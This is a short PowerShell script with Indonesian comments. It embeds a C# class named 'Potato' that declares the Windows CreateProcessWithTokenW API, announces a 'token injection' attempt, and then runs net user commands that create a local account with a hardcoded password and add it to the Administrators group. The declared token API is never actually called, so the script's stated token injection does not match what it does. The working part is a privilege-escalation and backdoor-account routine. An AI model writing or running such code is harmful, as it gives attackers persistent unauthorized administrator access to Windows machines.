$code = @"
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
public class Potato {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    public struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
    public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
}
"@
# Coba buat user lewat jalur API Windows langsung
Add-Type -TypeDefinition $code -Language CSharp
Write-Host "Mencoba injeksi token..."
net user temanggung-client Jakarta_2026_!#@! /add /y
net localgroup Administrators temanggung-client /add
